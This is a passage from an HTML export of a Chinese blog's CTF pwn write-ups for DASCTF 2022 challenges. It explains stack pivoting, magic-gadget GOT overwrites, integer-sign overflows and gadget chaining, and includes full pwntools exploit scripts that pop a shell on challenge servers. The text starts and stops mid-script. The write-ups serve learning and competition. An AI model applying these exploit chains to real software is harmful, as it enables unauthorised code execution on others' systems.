class="built_in">str</span>(puts_got_addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">puts_addr=u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">log(<span class="string">&#x27;puts_addr&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="comment">#result=local_search(&#x27;puts&#x27;,puts_addr,libc)</span></span><br><span class="line">result =long_search(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">sys_addr=result[<span class="number">0</span>]</span><br><span class="line">bin_sh_addr=result[<span class="number">1</span>]</span><br><span class="line">p.sendline(<span class="string">&#x27;-2147483800&#x27;</span>)</span><br><span class="line">a=<span class="number">4369</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(a+i))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">17</span>))</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x08049408</span></span><br><span class="line">log(<span class="string">&#x27;puts_plt_addr&#x27;</span>,(puts_plt_addr))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(sys_addr-(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(main_addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(bin_sh_addr-(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<img src="https://s2.loli.net/2022/05/27/91AutEp7wzOoacL.png" alt="image-20220526001630304" style="zoom: 67%;" />]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
      <tags>
        <tag>格式化字符串漏洞</tag>
        <tag>整数溢出</tag>
        <tag>ARM架构</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF2022_checkin</title>
    <url>/posts/59b6daad.html</url>
    <content><![CDATA[<p>通过这道题的学习和收获有：</p>
<p>1、栈迁移，何为栈？本来栈的定义就是rsp指针与rbp指针之间的就是栈。rsp在哪栈就在哪，因此两次leave，栈就变了两次，而真正跳到变化的栈那步是在最后的ret执行的。也算是对栈迁移又有了一点新的理解。</p>
<p>2、利用magic gadget修改got表</p>
<p>3、这道题的核心考察的就是栈迁移以及payload布局。</p>
<p>4、取magic gadget中的ebx时，如果ebx的值为正，则直接取，如果为负，则加0x100000000取补码。</p>
<p>5、如果可以的话，迁移到bss段尽量迁移到地址高一点的地方。这次打远程的那个exp就是因为bss段迁移的太低了，因为是破坏了某些数据，导致最后执行system函数的时候卡住了。</p>
<span id="more"></span>

<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/../img/2706180-20220328113024633-1772975266.png"></p>
<h2 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h2><p><img src="/../img/2706180-20220328113036736-1992703946.png"></p>
<p>可以发现，这道题就一个输入函数，没有输出函数，不过这个read具有16字节的溢出。这个没什么好想的，直接就栈迁移了。</p>
<p>然后输出函数也没有，泄露栈基地址这种情况就排除了，那就只能迁移到bss段。</p>
<p>先考虑一点，溢出16个字节仅仅只能去迁移，我们似乎没有办法去bss段布置数据。不过观察了一下汇编代码，发现read函数的第二个参数是由rbp确定的。</p>
<p><img src="/../img/2706180-20220328113048327-1891287888.png"></p>
<p>而我们可以利用溢出来控制rbp，因此就相当于可以控制read的输入的地方了，控制完rbp的话，只能在控制一个返回地址，既然控制rbp就已经相当于控制rsi了，那就返回0x4011BF再读一次（此时的read输入的地址已经是bss段了）。<strong>选取往bss段输入的内容，一定要把地址抬高，我最开始选择的是往0x404100这里写入数据再迁移，到了最后执行system的过程中给卡死了</strong></p>
<p>read结束之后，又到了leave;ret指令。<strong>leave指令就是mov rsp;rbp  pop rbp</strong>；</p>
<p>执行leave指令的时候，我们的rbp是什么？是我们要控制read函数的rsi来设定的rbp（它现在是bss段地址）</p>
<p>我还是用实际的数据来举例一下吧。假设我第一次控制rbp为（0x404600+0xa0），那rsi的值就是0x404600（因为buf为-0xa0）（即我们输入的数据是从0x404600处开始输入的）我们可以输入0xB0个数据，因此在0x404600+0xa0这个地方写入0x404600。</p>
<p>此时执行read结束后的leave指令是什么情况？（如下图）</p>
<p><img src="/../img/2706180-20220328113100100-154096690.png"></p>
<p><img src="/../img/2706180-20220328113111922-1348637698.png"></p>
<p><img src="/../img/2706180-20220328113121870-416873327.png"></p>
<p><img src="/../img/2706180-20220328113132111-1383092616.png"></p>
<p>总结一下上面的过程，<strong>原本read读入完我们的数据，<font color=#FF0000 >rbp指向的才是我们想跳转的地方（并非rbp本身）</font>而rbp本身距离我们想跳转的还有0xa0个字节，不过至少rbp就在bss段，执行了第一次leave之后，<font color=#FF0000 >rsp也就变成了rbp的值（同时由于pop rbp，此时的rbp又变成了rbp当初所指向的内容）</font>，此时已经迁移到bss段了（只不过我们还要再迁移到我们布置的数据那里）因此再来一次leave（这个是第二次read输入过去的），由于leave里的mov rsp,rbp，rsp再次被改变，最后完成了迁移（迁移到了我们布置在bss段里的数据）</strong></p>
<p>至此的话，大体框架就已经完成了。</p>
<p><strong>剩下的就是在bss段中布局payload了，本地的话非常简单，用magic gadget去将setvbuf函数地址修改为one_gadget地址，然后调用一下setvbuf就完事了。远程的话，roderick师傅给我说，因为动态库的原因，one_gadget用不了，因此只能把setvbuf改成puts函数，然后再劫持程序执行流，完成ret2libc。</strong></p>
<p>这里先简单说一下magic gadget吧，用ROPgadget –binary checkin –opcode 015dc3  去搜这个gadget的地址。015dc3是这个gadget的机器码（IDA里是看不见的，因为这个是机器码错位得到的）。</p>
<p>这个gadget长这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add    DWORD PTR [rbp-0x3d], ebx</span><br><span class="line">nop    DWORD PTR [eax+eax*1+0x0]</span><br><span class="line">repz ret</span><br></pre></td></tr></table></figure>

<p>核心是在第一行的add上，我们可以利用ret2csu控制rbp和rbx，由此就可以用这个修改函数的got表。以这道题为例，我现在想将setvbuf的真实地址改成one_gadget地址，只需要将rbp-0x3d写成setvbuf的got地址，将ebx放成setvbuf和one_gadget二者在libc库中的偏移即可。再调用这个one_gadget，即可完成修改got表。</p>
<p>这个magic gadget威力还是很大的，关于magic_gadget详细解释，我写在了这篇博客上  <a href="https://www.cnblogs.com/ZIKH26/articles/16193814.html">here</a></p>
<p>一句话概括本题思路，利用栈迁移到bss段，调试布置payload，利用magic gadget修改setvbuf got表为打印函数，最后ret2libc即可。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><p>这是打本地的，用的one_gadget。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./ab&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./ab&#x27;</span>)</span><br><span class="line">setvbuf_got_addr=e.got[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">setvbuf_plt_addr=<span class="number">0x401064</span></span><br><span class="line">bss_addr=<span class="number">0x404100</span>+<span class="number">0xa0</span></span><br><span class="line">leave_ret_addr=<span class="number">0x4011e2</span></span><br><span class="line">read_addr=<span class="number">0x4011bf</span></span><br><span class="line">magic_gadget=<span class="number">0x40113c</span></span><br><span class="line">csu1=<span class="number">0x40124A</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload=<span class="number">160</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr)+p64(read_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload=p64(<span class="number">0xdeadbeef</span>)+p64(csu1)+p64(<span class="number">0x8905c</span>)<span class="comment">#这个0x8905c为setvbuf和one_gadget二者地址在libc库中的差值</span></span><br><span class="line">payload+=p64(setvbuf_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget)</span><br><span class="line">payload+=p64(setvbuf_plt_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">160</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x404100</span>)+p64(leave_ret_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>比赛结束，远程的环境关闭了，不过roderick师傅远程打通了，我按照他这个思路写的，动态库换成比赛给的2.31，然后改成remote，远程也是ok的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./checkin&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,27544)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./checkin&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">puts_off=libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">setvbuf_off=libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_off))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(setvbuf_off))</span><br><span class="line">pop_rbp_addr=<span class="number">0x40113d</span></span><br><span class="line">read_got_addr=e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">setvbuf_got_addr=e.got[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">setvbuf_plt_addr=<span class="number">0x401064</span></span><br><span class="line">bss_addr=<span class="number">0x404600</span>+<span class="number">0xa0</span></span><br><span class="line">leave_ret_addr=<span class="number">0x4011e2</span></span><br><span class="line">read_addr=<span class="number">0x4011bf</span></span><br><span class="line">magic_gadget=<span class="number">0x40113c</span></span><br><span class="line">csu1=<span class="number">0x40124A</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401253</span></span><br><span class="line">ret_addr=<span class="number">0x40101a</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">if</span> puts_off&gt;setvbuf_off:</span><br><span class="line">    offset=puts_off-setvbuf_off</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    offset=puts_off-setvbuf_off+<span class="number">0x100000000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(offset))</span><br><span class="line">payload=<span class="number">160</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr)+p64(read_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload=p64(<span class="number">0xdeadbeef</span>)+p64(csu1)+p64(offset)<span class="comment">#rbx</span></span><br><span class="line">payload+=p64(setvbuf_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget)</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(read_got_addr)</span><br><span class="line">payload+=p64(setvbuf_plt_addr)</span><br><span class="line">payload+=p64(pop_rbp_addr)<span class="comment">#让rbp去指向0x404600（但是rbp本身是0x4046a0)，这样read结束之后触发了第一次leave，就让rsp的值为0x4046a8（这个地址指向的就是leave;ret）（此时rbp由于pop rbp，自身的值变成了0x404600），然后到ret，再次执行了leave;ret</span></span><br><span class="line"><span class="comment">#第二次leave，rsp才算变成了0x404608，然后ret实现了转移至布置到的system处。</span></span><br><span class="line">payload+=p64(<span class="number">0x404600</span>+<span class="number">0xa0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4011BF</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">160</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x404600</span>)+p64(leave_ret_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">read_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr))</span><br><span class="line">libc_base=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">sys_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(ret_addr)<span class="comment">#这道题需要栈对齐，具体细节我的另一篇博客上有讲。</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(bin_sh_addr)</span><br><span class="line">payload+=p64(sys_addr)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>如果不太理解exp为什么这样写，就多调试N遍（我光调试这远程一个脚本从写到各种调试再到打通再到彻底理解，调试了73遍…)，总会有所收获的😕</p>
]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
      <tags>
        <tag>one_gadget</tag>
        <tag>栈迁移</tag>
        <tag>magic_gadget</tag>
        <tag>篡改got表</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF2022.07赋能赛 pwn部分wp</title>
    <url>/posts/e4b35f09.html</url>
    <content><![CDATA[<p>赛题WP</p>
<span id="more"></span>

<h1 id="MyCanary2"><a href="#MyCanary2" class="headerlink" title="MyCanary2"></a>MyCanary2</h1><h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/../img/image-20221007211754434.png" alt="image-20221007211754434"></p>
<h2 id="程序逻辑："><a href="#程序逻辑：" class="headerlink" title="程序逻辑："></a>程序逻辑：</h2><p><img src="/../img/image-20221007211805698.png" alt="image-20221007211805698"></p>
<p>可以选择1，进行输入，并且这里存在了大量的溢出。</p>
<p>选择2，则是将一个随机数打印出来(这道题其实就相当于人工构造了一个canary)，不过打印出来之后会重新存入一个新的随机数。</p>
<p>选择3就会退出while的无限循环。</p>
<p>最后main函数返回的时候有一个检查如下</p>
<p><img src="/../img/image-20221007211843931.png" alt="image-20221007211843931"></p>
<p>如果v2不等于生成的随机数的话(也就是溢出时覆盖了v2)，程序就会exit。也就是说前面溢出控制的返回地址也没用了。同时v2是可以被read输入的数据覆盖的。</p>
<h2 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h2><p>这道题的思路就是通过随机数的检查，因此要么修改v2，要么修改0x4040d0上的随机数。因为这道题不可能输入到0x4040d0上，所以只考虑怎么修改v2的值为随机数。</p>
<p>唯一的方法就是选择1进行溢出返回地址后，<strong>再执行一次2将随机数打印出来，同时新的随机数又写到了v2。</strong></p>
<p>最后选择3后成功通过了随机数的检查，然后控制程序执行流即可。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27117</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">back_door=<span class="number">0x401577</span></span><br><span class="line">payload=(<span class="number">0x70</span>+<span class="number">8</span>)*<span class="string">b&#x27;\x00&#x27;</span>+p64(<span class="number">0x401589</span>)+p64(back_door)</span><br><span class="line"><span class="comment">#debug(p,0x401525,0x4014A9)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Show me the code:\n&#x27;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221007211858489.png" alt="image-20221007211858489"></p>
<h1 id="eyfor"><a href="#eyfor" class="headerlink" title="eyfor"></a>eyfor</h1><h2 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略:"></a>保护策略:</h2><p><img src="/../img/image-20221007211615854.png" alt="image-20221007211615854"></p>
<h2 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h2><p><img src="/../img/image-20221007211628523.png" alt="image-20221007211628523"></p>
<p>在vul函数中，a1的类型为int，但是read输入的时候强转成了unsigned int。这就意味着输入-1的话，read的第三个参数将变成0xffffffff,由于没有canary保护，所以这里就嘎嘎溢出了。</p>
<h2 id="利用思路：-1"><a href="#利用思路：-1" class="headerlink" title="利用思路："></a>利用思路：</h2><p>用strncpy把&#x2F;bin&#x2F;sh\x00复制到bss段上，由于存在后门函数，然后read溢出劫持执行流即可获取shell。</p>
<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h2><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;pwn4&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26600</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sys_plt_addr=e.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi_addr=<span class="number">0x400983</span> </span><br><span class="line">bss_addr=<span class="number">0x6010C0</span></span><br><span class="line">leave_ret=<span class="number">0x400914</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;go\n&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#debug(p,0x4007E8)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;message:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(<span class="number">0x400807</span>)+p64(pop_rdi_addr)+p64(bss_addr)+p64(sys_plt_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221007211651058.png" alt="image-20221007211651058"></p>
]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
  </entry>
  <entry>
    <title>DASCTF X GFCTF 2022十月挑战赛 PWN WP</title>
    <url>/posts/6b7e3e3a.html</url>
    <content><![CDATA[<p>这次比赛放了三道pwn，做起来还是蛮吃力的，shellcode那题还是经过师傅们提示才做出来的，R()P这题到比赛结束也没有做出来。通过这次比赛感觉自己对于汇编中的gadget理解和利用还是有写不足，在此写下wp记录一下解题的过程。</p>
<span id="more"></span>

<h2 id="R-P"><a href="#R-P" class="headerlink" title="R()P"></a>R()P</h2><h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011941852.png" alt="image-20221024192426317" style="zoom:50%;" />

<h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p><img src="/../img/image-20221024192010191.png" alt="image-20221024192010191"></p>
<p>代码非常的简单，就一个栈溢出漏洞，没有canary，可以随便溢。</p>
<p>最开始有个判断，buf&gt;0x100的话就会进入main函数递归，这里就是一个干扰的点，我们第一次直接发送一个\x00即可绕过这个检查。</p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>尽管代码非常短，但是利用起来有些麻烦。首先这道题就给了read函数，因此后续的利用就需要先篡改read的got表为syscall，然后控制rax为59，执行execve(“&#x2F;bin&#x2F;sh\x00”,0,0)</p>
<h4 id="篡改read的got表"><a href="#篡改read的got表" class="headerlink" title="篡改read的got表"></a>篡改read的got表</h4><p>想要篡改read的got表，肯定是需要向read got写入数据，因此怎么控制read的rsi成了一个问题，我们需要去观察汇编代码（如下）</p>
<p><img src="/../img/image-20221024193207882.png" alt="image-20221024193207882"></p>
<p>我们在第二个read输入后，eax的值会被[rsp+0xc]所赋值，因此如果我们精心构造栈里的数据，那么就可以控制eax，而后我们劫持执行流如果返回到0x40115a处，执行mov rsi,rax的话，就会将rax的值赋给rsi，然后再执行read，如此我们就控制了rsi，实现了read的任意写入，进行read的got表篡改。因为read函数距离syscall非常近(如下)，只差了0x10的偏移，因此我们只需要输入一个字节0x90即可将read的got表改为syscall的地址(我使用的glibc是2.35的)</p>
<p><img src="/../img/image-20221024193750318.png" alt="image-20221024193750318"></p>
<p>篡改后的情况如下：</p>
<p><img src="/../img/image-20221024194055530.png" alt="image-20221024194055530"></p>
<h4 id="将-x2F-bin-x2F-sh写入bss段"><a href="#将-x2F-bin-x2F-sh写入bss段" class="headerlink" title="将&#x2F;bin&#x2F;sh写入bss段"></a>将&#x2F;bin&#x2F;sh写入bss段</h4><p> 现在仅仅有了syscall，我们还需要&#x2F;bin&#x2F;sh字符串的地址，因此我们需要将该字符串布置到bss段（还是上面的方法，控制rax寄存器，跳转回0x40115a），同时查看ROPgadget发现下面的这个gadget</p>
<p><img src="/../img/image-20221024194558939.png" alt="image-20221024194558939"></p>
<p>这个0x404018就是bss段上的地址，因此我们将&#x2F;bin&#x2F;sh写到0x404018，再控制好rax(继续控制执行流)，直接去执行这个gadget，即可成功布局好rdi的值。</p>
<h4 id="控制rdx寄存器"><a href="#控制rdx寄存器" class="headerlink" title="控制rdx寄存器"></a>控制rdx寄存器</h4><p>上面虽然提到了怎么控制rdi寄存器，但是我们要先布局好rdx的值，才能去布置rdi寄存器，这个顺序不能错。原因如下：</p>
<p><img src="/../img/image-20221024195251658.png" alt="image-20221024195251658"></p>
<p>我们控制edx寄存器，必须通过上图的gadget，但是如果执行这个gadget就务必让edi清零了，因此我们只能先让edx变成0，再去布置rdi的值。</p>
<p>这里的思路就是让程序的执行流返回到0x40115d，因为edx是从栈里给的(而我们又能控制栈里的数据，变相的就控制了栈里的数据)，然后将edx置成0，而接下来的read函数执行时，虽然rdx是0也没有关系，顶多就是写不进去数据而已。</p>
<h4 id="控制rdi寄存器"><a href="#控制rdi寄存器" class="headerlink" title="控制rdi寄存器"></a>控制rdi寄存器</h4><p>控制rdi寄存器所需要的gadget是<code>mov edi, 0x404018 ; jmp rax</code>,在这之前我们需要将rax改成一个地址，才能保证执行流不会断，所以在刚刚提到的控制rdx寄存器的部分，最后应该让执行流到0x40116d这个地址，去控制rax，然后去跳转到<code>mov edi, 0x404018 ; jmp rax</code>上。</p>
<p>执行完这段gadget我们的rdi和rdx都控制完了，而rsi最后可以控制，因此我们还需要控制下rax，控制rax的gadget就是0x40116d。所以我们先将rax的值设置为0x40116d，这样最后就会jmp过去</p>
<h4 id="控制rax-rsi寄存器"><a href="#控制rax-rsi寄存器" class="headerlink" title="控制rax,rsi寄存器"></a>控制rax,rsi寄存器</h4><p>又跳转到了0x40116d的位置，我们先控制rax的值为59，然后去跳转到0x401141地址处，最后控制下rsi的值，开始执行read函数时，因为read的got表已经被篡改为了syscall，我们参数全部布置好了，到此即可获取shell(如下)</p>
<p><img src="/../img/image-20221024201001179.png" alt="image-20221024201001179"></p>
<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><p><a href="https://zikh26.github.io/posts/ad411136.html">tools</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p,e,libc=load(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26579&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x401168</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>+p32(e.got[<span class="string">&#x27;read&#x27;</span>])<span class="comment">#second read rsi</span></span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0x40115a</span>)<span class="comment">#first return address</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;c&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x404018</span>)<span class="comment">#third read rsi</span></span><br><span class="line">payload+=<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0x40115a</span>)<span class="comment">#second return address</span></span><br><span class="line">payload+=<span class="string">b&#x27;s&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=<span class="string">b&#x27;e&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x8</span>)<span class="comment">#third read rdx&amp;eax</span></span><br><span class="line">payload+=<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0x40115d</span>)<span class="comment">#fourth return address</span></span><br><span class="line">payload+=<span class="string">b&#x27;i&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=<span class="string">b&#x27;g&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x0</span>)<span class="comment">#will change read rdx to zero</span></span><br><span class="line">payload+=<span class="string">b&#x27;h&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0x40116d</span>)<span class="comment">#fifth return address</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;t&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x40116D</span>)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(<span class="number">0x401099</span>)<span class="comment">#sixth return address</span></span><br><span class="line">payload+=p64(<span 